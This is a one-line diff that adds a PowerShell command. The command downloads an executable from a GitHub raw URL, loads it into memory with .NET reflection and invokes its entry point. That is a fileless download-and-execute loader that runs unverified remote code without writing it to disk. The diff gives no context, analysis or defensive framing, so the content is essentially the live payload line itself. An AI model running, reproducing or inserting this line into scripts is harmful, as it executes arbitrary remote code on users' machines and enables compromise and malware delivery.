@@ -1,0 +1,1 @@
+[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("https://github.com/starbypass01-beep/Names/raw/refs/heads/main/xyz.exe")).EntryPoint.Invoke($null, $null)
